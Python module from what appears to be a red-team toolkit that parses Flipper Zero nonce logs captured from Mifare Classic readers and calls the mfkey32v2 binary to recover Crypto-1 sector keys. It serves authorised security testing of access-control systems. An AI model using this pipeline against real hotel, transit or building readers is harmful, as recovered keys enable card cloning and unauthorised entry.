"""mfkey32_solver — host-side Crypto-1 key recovery from captured nonces.

PLAIN ENGLISH:
==============
The Flipper Zero, when you run "Detect Reader" in the NFC app and tap a
Mifare Classic reader (a hotel door, a transit gate, a building fob reader),
records the encrypted handshake bytes the reader sent. Those bytes leak
*just enough* information that, with the right math, you can recover the
secret key the reader and card share for that sector.

That math is the mfkey32 algorithm, originally published as part of the
Crypto-1 break (Garcia, Koning Gans, et al, 2008).

This module wraps the mfkey32 binary as a subprocess. Why a wrapper and
not a pure-Python re-implementation?
  - Crypto-1 LFSR rollback math is ~400 lines of bit-twiddling that's
    easy to get subtly wrong.
  - The reference C implementation (equipter/mfkey32v2) has been
    battle-tested on thousands of real captures.
  - Pure-Python would be 1000x slower for the same result.
  - Operators in the red-team space typically have mfkey32 installed
    already (or can `apt install mfoc` / `brew install mfoc` to get it).

If the binary isn't found, the solver returns a clear "missing tool"
error with install instructions. No silent fallback, no fake math.

INPUT FORMAT (.mfkey32.log from Flipper):
========================================
The Flipper writes one line per captured nonce-pair:
  Sec <sector> key <A|B> cuid <hex8> nt <hex8> nr <hex8> ar <hex8> at <hex8>
  Sec 1 key A cuid 1234abcd nt 89abcdef nr fedcba98 ar 76543210 at 0fedcba9

Multiple captures of the same (sector, key_type) are needed — usually 2.
mfkey32 v2 takes pairs and outputs the recovered key in hex.

OUTPUT SHAPE:
=============
List of RecoveredKey objects, one per (sector, key_type) where recovery
succeeded. Failures are returned as RecoveryFailure entries so the audit
log captures them.
"""

from __future__ import annotations

import logging
import re
import shutil
import subprocess
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

log = logging.getLogger("llmdr_redteam.missions.mfkey32_solver")


# ---------- data shapes -------------------------------------------------

@dataclass(frozen=True)
class NoncePair:
    """One row from a .mfkey32.log file."""
    sector: int
    key_type: str  # "A" or "B"
    cuid: str      # 4-byte card UID, lowercase hex8
    nt: str        # tag nonce, hex8
    nr: str        # reader nonce, hex8
    ar: str        # reader auth response, hex8
    at: str        # tag auth response, hex8


@dataclass(frozen=True)
class RecoveredKey:
    sector: int
    key_type: str        # "A" or "B"
    key_hex: str         # 6-byte key, lowercase hex12
    nonce_pairs_used: int
    notes: str = ""


@dataclass(frozen=True)
class RecoveryFailure:
    sector: int
    key_type: str
    reason: str
    nonce_pairs_seen: int


@dataclass(frozen=True)
class SolveResult:
    recovered: list[RecoveredKey] = field(default_factory=list)
    failed:    list[RecoveryFailure] = field(default_factory=list)
    nonces_parsed: int = 0
    solver_version: str = "unknown"

    @property
    def success(self) -> bool:
        return len(self.recovered) > 0

    def to_dict(self) -> dict:
        return {
            "recovered": [
                {"sector": r.sector, "key_type": r.key_type,
                 "key_hex": r.key_hex, "nonce_pairs_used": r.nonce_pairs_used,
                 "notes": r.notes}
                for r in self.recovered
            ],
            "failed": [
                {"sector": f.sector, "key_type": f.key_type,
                 "reason": f.reason, "nonce_pairs_seen": f.nonce_pairs_seen}
                for f in self.failed
            ],
            "nonces_parsed": self.nonces_parsed,
            "solver_version": self.solver_version,
        }


# ---------- log parsing -------------------------------------------------

# Tolerant pattern: matches Flipper's .mfkey32.log line shape across
# Momentum + OFW variations. All hex values lowercased on parse.
_LINE_RE = re.compile(
    r"Sec\s+(?P<sector>\d+)\s+"
    r"key\s+(?P<key_type>[AB])\s+"
    r"cuid\s+(?P<cuid>[0-9A-Fa-f]{8})\s+"
    r"nt\s+(?P<nt>[0-9A-Fa-f]{8})\s+"
    r"nr\s+(?P<nr>[0-9A-Fa-f]{8})\s+"
    r"ar\s+(?P<ar>[0-9A-Fa-f]{8})\s+"
    r"at\s+(?P<at>[0-9A-Fa-f]{8})"
)


class Mfkey32ParseError(ValueError):
    """Raised when a log line we expected to be a nonce-pair doesn't parse."""


def parse_mfkey32_log(text: str) -> list[NoncePair]:
    """Parse a Flipper .mfkey32.log file body into NoncePair objects.

    Comments (lines starting with #) and blank lines are ignored. Lines
    that look like data but don't match the pattern raise Mfkey32ParseError
    with the offending line — fail loud, not silent.
    """
    pairs: list[NoncePair] = []
    for lineno, raw in enumerate(text.splitlines(), start=1):
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = _LINE_RE.match(line)
        if not m:
            raise Mfkey32ParseError(
                f"line {lineno}: unrecognized format: {raw!r}"
            )
        pairs.append(NoncePair(
            sector=int(m.group("sector")),
            key_type=m.group("key_type"),
            cuid=m.group("cuid").lower(),
            nt=m.group("nt").lower(),
            nr=m.group("nr").lower(),
            ar=m.group("ar").lower(),
            at=m.group("at").lower(),
        ))
    return pairs


def group_pairs(pairs: list[NoncePair]) -> dict[tuple[int, str], list[NoncePair]]:
    """Group nonce pairs by (sector, key_type). mfkey32 needs >= 2 pairs
    per group to recover a key (the algorithm intersects candidates from
    each pair to converge on the unique key).
    """
    groups: dict[tuple[int, str], list[NoncePair]] = {}
    for p in pairs:
        groups.setdefault((p.sector, p.key_type), []).append(p)
    return groups


# ---------- binary discovery --------------------------------------------

# Operators may have any of these on PATH. We probe in priority order.
_BINARY_NAMES = ("mfkey32v2", "mfkey32", "mfkey")


def find_solver_binary() -> Optional[str]:
    """Return the absolute path to a mfkey32 binary, or None if missing."""
    for name in _BINARY_NAMES:
        path = shutil.which(name)
        if path:
            return path
    return None


class SolverBinaryMissing(RuntimeError):
    """Raised when no mfkey32 binary is on PATH and no override given."""


_INSTALL_HINT = (
    "mfkey32 binary not found on PATH. Install one of:\n"
    "  - Linux:   apt install libnfc-bin (provides mfoc/mfcuk; mfkey32 from\n"
    "             https://github.com/equipter/mfkey32v2 — build with `make`)\n"
    "  - macOS:   brew install libnfc, then build mfkey32v2 from source\n"
    "  - Windows: build mfkey32v2.exe with MSYS2 + gcc, drop on PATH\n"
    "  - Or pass solver_path=... explicitly to the mission."
)


# ---------- the solve call ----------------------------------------------

def _run_solver_binary(
    solver_path: str,
    pairs: list[NoncePair],
    timeout_sec: float = 30.0,
) -> Optional[str]:
    """Invoke the binary on a 2-pair set. Returns the recovered key as
    lowercase hex12, or None if the binary failed to recover.

    mfkey32v2 invocation:
      mfkey32v2 <uid> <nt0> <nr0> <ar0> <at0> <nt1> <nr1> <ar1> <at1>
    Output contains a line like 'Found Key: [a0a1a2a3a4a5]'
    """
    if len(pairs) < 2:
        return None

    p0, p1 = pairs[0], pairs[1]
    args = [
        solver_path,
        p0.cuid, p0.nt, p0.nr, p0.ar, p0.at,
        p1.nt, p1.nr, p1.ar, p1.at,
    ]
    log.debug("invoking solver: %s", " ".join(args))
    try:
        proc = subprocess.run(
            args, capture_output=True, text=True,
            timeout=timeout_sec, check=False,
        )
    except subprocess.TimeoutExpired:
        log.warning("solver timed out after %ss", timeout_sec)
        return None
    except FileNotFoundError:
        raise SolverBinaryMissing(_INSTALL_HINT)

    out = (proc.stdout or "") + "\n" + (proc.stderr or "")
    # Match 'Found Key: [hex12]' OR 'KEY: hex12' OR bare hex12 on its own line.
    m = re.search(r"\b([0-9a-fA-F]{12})\b", out)
    if not m:
        log.debug("solver returned no key. stdout=%r stderr=%r",
                  proc.stdout, proc.stderr)
        return None
    return m.group(1).lower()


def solve(
    pairs: list[NoncePair],
    *,
    solver_path: Optional[str] = None,
) -> SolveResult:
    """Recover keys from a list of nonce pairs.

    Args:
        pairs: list of NoncePair from parse_mfkey32_log.
        solver_path: explicit binary path. If None, autodiscovery via PATH.

    Returns:
        SolveResult with recovered + failed lists.

    Raises:
        SolverBinaryMissing: no mfkey32 binary available and no override.
    """
    binary = solver_path or find_solver_binary()
    if not binary:
        raise SolverBinaryMissing(_INSTALL_HINT)

    groups = group_pairs(pairs)
    recovered: list[RecoveredKey] = []
    failed:    list[RecoveryFailure] = []

    for (sector, key_type), group_pairs_list in groups.items():
        if len(group_pairs_list) < 2:
            failed.append(RecoveryFailure(
                sector=sector, key_type=key_type,
                reason="need >= 2 nonce pairs (mfkey32 intersects candidate "
                       "sets from multiple captures)",
                nonce_pairs_seen=len(group_pairs_list),
            ))
            continue

        key_hex = _run_solver_binary(binary, group_pairs_list)
        if key_hex:
            recovered.append(RecoveredKey(
                sector=sector, key_type=key_type,
                key_hex=key_hex,
                nonce_pairs_used=2,
                notes=f"used pairs 0,1 of {len(group_pairs_list)} available",
            ))
        else:
            failed.append(RecoveryFailure(
                sector=sector, key_type=key_type,
                reason="solver ran but did not output a key — nonces may be "
                       "weak or non-vulnerable variant",
                nonce_pairs_seen=len(group_pairs_list),
            ))

    return SolveResult(
        recovered=recovered,
        failed=failed,
        nonces_parsed=len(pairs),
        solver_version=Path(binary).name,
    )
